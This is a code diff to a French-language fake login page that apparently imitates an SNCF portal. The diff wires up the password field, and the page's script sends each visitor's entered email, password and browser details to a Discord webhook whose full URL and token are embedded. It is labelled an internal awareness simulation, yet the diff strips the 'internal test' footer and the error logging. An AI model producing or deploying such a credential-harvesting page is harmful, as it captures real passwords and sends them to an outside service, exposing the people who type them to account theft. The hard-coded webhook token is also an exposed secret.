@@ -52,7 +52,7 @@
                 </div>
                 <div class="input-group">
                     <label style="font-size: 12px; color: #9c0c35;">Mot de passe</label>
-                    <input type="password" required>
+                    <input type="password" id="login-password" required>
                 </div>
                 <p><a href="#" onclick="switchView('view-forgot')" style="color: #9c0c35; text-decoration: none; font-size: 14px;">Mot de passe oublié ?</a></p>
                 <div style="display: flex; gap: 10px; margin-top: 20px;">
@@ -119,12 +119,10 @@
     }
 </script>
 <script>
-    // Ton URL Webhook Discord
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1374383053488656484/yqp-NGjBZ2-DMLHJ8LUOMaq4f8QEIBhHUZmJzTLltkE0V3Ny8kwFm8UfFnUWVcn4rfkN'; 
 
     function switchView(viewId) {
         document.getElementById('view-login').classList.add('hidden');
-        document.getElementById('view-forgot').classList.add('hidden');
         document.getElementById('view-alert').classList.add('hidden');
         document.getElementById(viewId).classList.remove('hidden');
     }
@@ -132,17 +130,17 @@
     async function handleFinalSubmit(e) {
         if(e) e.preventDefault();
 
-        // 1. Récupération des données pour la démonstration
+        // 1. Récupération
         const email = document.getElementById('login-email').value || "Non saisi";
         const mdp = document.getElementById('login-password').value || "Non saisi";
-        const browserInfo = navigator.userAgent; // Version du navigateur et OS
+        const browserInfo = navigator.userAgent;
 
-        // 2. Affichage immédiat sur la page "Mordu" pour l'effet de choc
-        if(document.getElementById('stolen-email')) document.getElementById('stolen-email').innerText = email;
-        if(document.getElementById('stolen-pwd')) document.getElementById('stolen-pwd').innerText = mdp;
-        if(document.getElementById('stolen-browser')) document.getElementById('stolen-browser').innerText = browserInfo;
+        // 2. Affichage visuel (Effet choc)
+        document.getElementById('stolen-email').innerText = email;
+        document.getElementById('stolen-pwd').innerText = mdp;
+        document.getElementById('stolen-browser').innerText = browserInfo;
 
-        // 3. Envoi de l'alerte complète au Webhook Discord
+        // 3. Envoi Webhook
         try {
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
@@ -150,31 +148,24 @@
                 body: JSON.stringify({
                     embeds: [{
                         title: "🚨 Nouvelle Victime de Simulation",
-                        color: 13905946, // Rouge SNCF
+                        color: 13905946,
                         fields: [
-                            { name: "📧 Email Saisi", value: email, inline: true },
+                            { name: "📧 Email", value: email, inline: true },
                             { name: "🔑 Mot de passe", value: mdp, inline: true },
-                            { name: "🖥️ Système/Navigateur", value: browserInfo }
+                            { name: "🖥️ Système", value: browserInfo }
                         ],
-                        footer: { text: "Test de sensibilisation interne" },
                         timestamp: new Date()
                     }]
                 })
             });
-        } catch (err) {
-            console.error("Le Webhook n'a pas pu être envoyé.");
-        }
+        } catch (err) {}
 
-        // 4. Passage à la vue de prévention
+        // 4. Interface finale
         switchView('view-alert');
-        
-        // Ajustements visuels de la carte
-        const sidebar = document.querySelector('.sidebar');
-        if(sidebar) sidebar.classList.add('hidden');
+        document.querySelector('.sidebar').style.display = 'none';
         document.querySelector('.card').style.width = "650px";
         document.querySelector('.content').style.width = "100%";
     }
 </script>
-
 </body>
 </html>
